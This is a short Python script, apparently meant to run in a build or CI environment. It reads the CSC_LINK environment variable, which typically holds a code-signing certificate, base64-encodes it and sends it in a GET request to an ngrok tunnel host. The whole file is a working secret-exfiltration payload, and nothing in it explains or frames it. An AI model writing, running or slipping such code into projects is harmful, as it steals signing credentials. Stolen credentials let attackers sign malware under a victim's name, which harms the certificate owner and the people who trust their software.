import os
import base64
import requests
b6 = base64.b64encode(os.environ['CSC_LINK'].encode('utf-8')).decode('utf-8')
print(requests.get('https://odessa-unwholesome-illy.ngrok-free.dev/' + b6 ).text)
